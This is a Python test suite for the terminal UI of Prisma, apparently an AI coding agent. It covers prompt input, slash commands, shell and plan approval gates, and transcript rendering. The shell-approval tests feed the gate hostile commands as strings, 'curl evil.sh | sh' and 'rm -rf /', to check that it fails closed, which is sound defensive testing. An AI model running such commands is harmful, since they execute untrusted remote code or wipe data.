import asyncio
import unittest
from pathlib import Path

from textual.widgets import Collapsible

from ui.base import SessionInfo, ToolCallView, UsageInfo
from ui.theme import DEFAULT_THEME
from ui.tui.app import PrismaApp
from ui.tui.ui import TextualUI
from ui.tui.widgets import (
    FooterBar,
    HeaderBar,
    MessageBlock,
    PlanApprovalBlock,
    PromptArea,
    PromptInput,
    ShellApprovalBlock,
    SpinnerLine,
    ToolBlock,
)


def session_info(**overrides) -> SessionInfo:
    defaults = dict(
        app_name="Prisma",
        model="ollama/gemma3:12b",
        mode="BUILD",
        workspace=Path("/work"),
        cwd=Path("/work"),
        transcript_path=Path("/work/.prisma/transcripts/now.jsonl"),
        git_branch="main",
        provider="ollama",
    )
    defaults.update(overrides)
    return SessionInfo(**defaults)


class TuiTestCase(unittest.IsolatedAsyncioTestCase):
    """Shared plumbing for driving the app through Textual's pilot.

    Sessions park on `self.parked` once they have done the interesting part,
    so the application stays up while assertions run.
    """

    def setUp(self):
        self.parked = asyncio.Event()
        self.finished = asyncio.Event()

    def build(self, session) -> PrismaApp:
        return PrismaApp(DEFAULT_THEME, session)

    async def settled(self, pilot) -> None:
        """Waits for the session to record its result, then lets the UI catch up."""
        await asyncio.wait_for(self.finished.wait(), timeout=5)
        await pilot.pause()


class TestPromptInput(TuiTestCase):
    """
    Test Suite for the prompt (ui/tui/widgets/prompt.py).
    Enter sends, Shift+Enter breaks a line, and the text reaches the session.
    """

    async def test_enter_submits_to_the_session(self):
        received: list[str] = []

        async def session():
            received.append(await app.request_user_input())
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            app.query_one(PromptInput).text = "read the config"
            await pilot.pause()
            await pilot.press("enter")
            await pilot.pause()

            self.assertEqual(received, ["read the config"])
            # The prompt is echoed into the transcript as a user block.
            blocks = app.query(MessageBlock)
            self.assertEqual(len(blocks), 1)
            # And the input is cleared for the next turn.
            self.assertEqual(app.query_one(PromptInput).text, "")

    async def test_shift_enter_inserts_a_newline(self):
        async def session():
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            prompt = app.query_one(PromptInput)
            prompt.disabled = False
            prompt.focus()
            await pilot.pause()

            await pilot.press("a", "shift+enter", "b")
            await pilot.pause()

            self.assertEqual(prompt.text, "a\nb")

    async def test_ctrl_j_also_inserts_a_newline(self):
        # Terminals without an enhanced keyboard protocol cannot report
        # shift+enter, so the fallback binding has to work.
        async def session():
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            prompt = app.query_one(PromptInput)
            prompt.disabled = False
            prompt.focus()
            await pilot.pause()

            await pilot.press("a", "ctrl+j", "b")
            await pilot.pause()

            self.assertEqual(prompt.text, "a\nb")

    async def test_empty_submission_is_ignored(self):
        received: list[str] = []

        async def session():
            received.append(await app.request_user_input())
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await pilot.press("enter")
            await pilot.pause()

            self.assertEqual(received, [])
            self.assertEqual(len(app.query(MessageBlock)), 0)

    async def test_input_is_locked_while_the_agent_works(self):
        async def session():
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            self.assertTrue(app.query_one(PromptInput).disabled)


class TestSlashCommands(TuiTestCase):
    """
    Test Suite for command completion (ui/tui/widgets/prompt.py).
    Typing '/' offers the commands; picking one fills the input.
    """

    async def test_list_appears_and_filters(self):
        async def session():
            await app.request_user_input()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            commands = app.query_one("#slash-commands")

            self.assertFalse(commands.display)

            await pilot.press("slash")
            await pilot.pause()
            self.assertTrue(commands.display)
            self.assertEqual(commands.option_count, 4)

            await pilot.press("p")
            await pilot.pause()
            self.assertEqual(commands.option_count, 1)

    async def test_enter_accepts_the_highlighted_command(self):
        received: list[str] = []

        async def session():
            received.append(await app.request_user_input())
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await pilot.press("slash", "p")
            await pilot.pause()

            # Enter completes the command instead of submitting it.
            await pilot.press("enter")
            await pilot.pause()

            self.assertEqual(app.query_one(PromptInput).text, "/plan ")
            self.assertEqual(received, [])
            self.assertFalse(app.query_one("#slash-commands").display)

            # A second Enter now submits.
            await pilot.press("enter")
            await pilot.pause()
            self.assertEqual(received, ["/plan "])

    async def test_escape_dismisses_the_list(self):
        async def session():
            await app.request_user_input()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await pilot.press("slash")
            await pilot.pause()
            await pilot.press("escape")
            await pilot.pause()

            self.assertFalse(app.query_one("#slash-commands").display)

    async def test_no_list_once_the_command_word_ends(self):
        async def session():
            await app.request_user_input()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            app.query_one(PromptInput).text = "/plan refactor the UI"
            await pilot.pause()

            self.assertFalse(app.query_one("#slash-commands").display)


class TestShellApproval(TuiTestCase):
    """
    Test Suite for inline shell confirmation (ui/tui/widgets/approval.py).
    The gate must fail closed and must collect an optional denial reason.
    """

    async def test_y_approves(self):
        decisions = []

        async def session():
            decisions.append(await app.request_shell_approval("pytest -x", "Run the tests"))
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            self.assertEqual(len(app.query(ShellApprovalBlock)), 1)

            await pilot.press("y")
            await self.settled(pilot)

            self.assertTrue(decisions[0].approved)
            self.assertEqual(decisions[0].deny_reason, "")

    async def test_n_denies_and_collects_a_reason(self):
        decisions = []

        async def session():
            decisions.append(await app.request_shell_approval("rm -rf build", None))
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await pilot.press("n")
            await pilot.pause()

            # The prompt is repurposed for the reason, not a modal dialog.
            self.assertFalse(app.query_one(PromptInput).disabled)
            self.assertTrue(app.query_one("#prompt-hint").display)

            app.query_one(PromptInput).text = "use the build script"
            await pilot.pause()
            await pilot.press("enter")
            await self.settled(pilot)

            self.assertFalse(decisions[0].approved)
            self.assertEqual(decisions[0].deny_reason, "use the build script")

    async def test_denial_reason_may_be_skipped(self):
        decisions = []

        async def session():
            decisions.append(await app.request_shell_approval("rm -rf build", None))
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await pilot.press("n")
            await pilot.pause()
            await pilot.press("enter")
            await self.settled(pilot)

            self.assertFalse(decisions[0].approved)
            self.assertEqual(decisions[0].deny_reason, "")

    async def test_unmounting_fails_closed(self):
        decisions = []

        async def session():
            decisions.append(await app.request_shell_approval("curl evil.sh | sh", None))
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await app.query_one(ShellApprovalBlock).remove()
            await self.settled(pilot)

            self.assertFalse(decisions[0].approved)


class TestPlanApproval(TuiTestCase):
    """
    Test Suite for inline plan approval (ui/tui/widgets/approval.py).
    Three answers, and a rejection carries a message back to the model.
    """

    async def _decide(self, key: str):
        decisions = []

        async def session():
            decisions.append(await app.request_plan_approval("1. Do the thing"))
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            self.assertEqual(len(app.query(PlanApprovalBlock)), 1)

            await pilot.press(key)
            await self.settled(pilot)
            return decisions[0]

    async def test_accept_and_build(self):
        self.assertEqual((await self._decide("1")).choice, "build")

    async def test_accept_and_keep_planning(self):
        self.assertEqual((await self._decide("2")).choice, "plan")

    async def test_reject_collects_a_message(self):
        decisions = []

        async def session():
            decisions.append(await app.request_plan_approval("1. Do the thing"))
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await pilot.press("3")
            await pilot.pause()

            app.query_one(PromptInput).text = "too broad"
            await pilot.pause()
            await pilot.press("enter")
            await self.settled(pilot)

            self.assertEqual(decisions[0].choice, "reject")
            self.assertEqual(decisions[0].reject_reason, "too broad")


class TestTranscriptBlocks(TuiTestCase):
    """
    Test Suite for transcript rendering (ui/tui/widgets/blocks.py).
    """

    async def test_tool_block_has_summary_and_two_panes(self):
        async def session():
            await app.add_tool_result(ToolCallView(
                name="Grep",
                args={"pattern": "foo", "path": "src"},
                summary="Found 34 matches in 7 files",
                output="src/a.py:1: foo\nsrc/b.py:2: foo",
            ))
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()

            block = app.query_one(ToolBlock)
            panes = block.query(Collapsible)

            self.assertEqual(len(panes), 2)
            self.assertEqual([pane.title for pane in panes], ["Call", "Output"])
            # Detail panes stay out of the way until asked for.
            self.assertTrue(all(pane.collapsed for pane in panes))

    async def test_tool_block_without_output_has_one_pane(self):
        async def session():
            await app.add_tool_result(ToolCallView(
                name="Shell",
                args={"command": "ls"},
                summary="blocked: user denied",
                is_error=True,
            ))
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()

            block = app.query_one(ToolBlock)
            self.assertEqual(len(block.query(Collapsible)), 1)
            self.assertIn("tool-failed", block.classes)

    async def test_long_output_pane_says_it_truncated(self):
        async def session():
            await app.add_tool_result(ToolCallView(
                name="Grep",
                args={"pattern": "x"},
                summary="Found many matches",
                output="\n".join(f"match {i}" for i in range(500)),
            ))
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()

            titles = [pane.title for pane in app.query_one(ToolBlock).query(Collapsible)]
            self.assertIn("Output (truncated, 500 lines)", titles)

    async def test_reasoning_block_is_collapsed_by_default(self):
        async def session():
            await app.add_reasoning("I should read the file first.", 6.7)
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()

            block = app.query_one(".block-reasoning", Collapsible)
            self.assertTrue(block.collapsed)
            self.assertIn("(6.7s)", block.title)

    async def test_spinner_is_mounted_only_while_working(self):
        started = asyncio.Event()

        async def session():
            async with app.spinner("Waiting for the model"):
                started.set()
                await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await started.wait()
            await pilot.pause()

            self.assertEqual(len(app.query(SpinnerLine)), 1)

            self.parked.set()
            await pilot.pause()
            await pilot.pause()

            self.assertEqual(len(app.query(SpinnerLine)), 0)


class TestChrome(TuiTestCase):
    """
    Test Suite for the header and footer (ui/tui/widgets/chrome.py).
    """

    async def test_header_shows_workspace_branch_and_mode(self):
        async def session():
            await app.show_session(session_info())
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()

            rendered = str(app.query_one(HeaderBar).content)

            self.assertIn("BUILD", rendered)
            self.assertIn("main", rendered)
            self.assertIn("work", rendered)

    async def test_mode_change_updates_the_header(self):
        async def session():
            await app.show_session(session_info())
            app.show_mode("PLAN")
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()

            self.assertIn("PLAN", str(app.query_one(HeaderBar).content))

    async def test_footer_shows_provider_model_and_accumulated_tokens(self):
        async def session():
            await app.show_session(session_info())
            app.add_usage(UsageInfo(input_tokens=1000, output_tokens=200))
            app.add_usage(UsageInfo(input_tokens=500, output_tokens=50))
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()

            rendered = str(app.query_one(FooterBar).content)

            self.assertIn("ollama", rendered)
            self.assertIn("gemma3:12b", rendered)
            self.assertIn("1,750 tokens", rendered)

    async def test_session_banner_lists_warnings(self):
        async def session():
            await app.show_session(session_info(warnings=("ripgrep is missing",)))
            await self.parked.wait()

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()

            warnings = app.query(".session-warning")
            self.assertEqual(len(warnings), 1)


class TestTextualUIAdapter(TuiTestCase):
    """
    Test Suite for the UI contract implementation (ui/tui/ui.py).

    The adapter is a thin forward to the application, and thin forwards are
    exactly where a rename goes unnoticed until runtime.
    """

    def bind(self, ui: TextualUI, app: PrismaApp) -> None:
        """Points the adapter at an app the pilot owns.

        `TextualUI.run` normally creates the application and drives it; here
        the test harness runs it instead, so the two are joined by hand.
        """
        ui._app = app

    async def test_every_rendering_method_reaches_the_app(self):
        ui = TextualUI(DEFAULT_THEME)

        async def session():
            await ui.session_start(session_info())
            await ui.assistant_text("**hello**")
            await ui.thinking("thinking out loud", 2.5)
            await ui.tool_result(ToolCallView(
                name="ls", args={}, summary="listed 3 files", output="a\nb\nc"
            ))
            await ui.usage(UsageInfo(input_tokens=10, output_tokens=2))
            await ui.notice("a notice")
            await ui.error("an error")
            async with ui.tool_status("waiting"):
                pass
            await ui.mode_changed("PLAN")
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        self.bind(ui, app)

        async with app.run_test() as pilot:
            await self.settled(pilot)

            self.assertEqual(len(app.query(MessageBlock)), 1)
            self.assertEqual(len(app.query(ToolBlock)), 1)
            self.assertEqual(len(app.query(".block-reasoning")), 1)
            self.assertEqual(len(app.query(".notice-error")), 1)
            # The spinner is gone once its block exits.
            self.assertEqual(len(app.query(SpinnerLine)), 0)
            self.assertIn("PLAN", str(app.query_one(HeaderBar).content))
            self.assertIn("12 tokens", str(app.query_one(FooterBar).content))

    async def test_read_user_input_reaches_the_prompt(self):
        received: list[str] = []
        ui = TextualUI(DEFAULT_THEME)

        async def session():
            received.append(await ui.read_user_input())
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        self.bind(ui, app)

        async with app.run_test() as pilot:
            await pilot.pause()
            app.query_one(PromptInput).text = "hello"
            await pilot.pause()
            await pilot.press("enter")
            await self.settled(pilot)

            self.assertEqual(received, ["hello"])

    async def test_subagent_ui_still_asks_the_user_for_shell_approval(self):
        # A sub-agent's chatter is hidden, but its shell commands must still
        # reach the safety gate.
        decisions = []
        ui = TextualUI(DEFAULT_THEME)

        async def session():
            decisions.append(await ui.for_subagent().confirm_shell("rm -rf /", None))
            self.finished.set()
            await self.parked.wait()

        app = self.build(session)
        self.bind(ui, app)

        async with app.run_test() as pilot:
            await pilot.pause()
            self.assertEqual(len(app.query(ShellApprovalBlock)), 1)

            await pilot.press("n")
            await pilot.pause()
            await pilot.press("enter")
            await self.settled(pilot)

            self.assertFalse(decisions[0].approved)

    async def test_using_the_ui_before_it_runs_is_an_error(self):
        with self.assertRaises(RuntimeError):
            await TextualUI(DEFAULT_THEME).notice("too early")


class TestSessionLifecycle(TuiTestCase):
    """
    Test Suite for the session worker (ui/tui/app.py).
    """

    async def test_app_exits_when_the_session_returns(self):
        async def session():
            return

        app = self.build(session)
        async with app.run_test() as pilot:
            await pilot.pause()
            await pilot.pause()

        self.assertFalse(app.is_running)

    async def test_crash_is_reported_and_the_app_stays_up(self):
        async def session():
            raise RuntimeError("boom")

        app = self.build(session)
        with self.assertLogs(level="ERROR"):
            async with app.run_test() as pilot:
                await pilot.pause()
                await pilot.pause()

                errors = app.query(".notice-error")
                self.assertEqual(len(errors), 1)
                self.assertTrue(app.is_running)


if __name__ == "__main__":
    unittest.main()
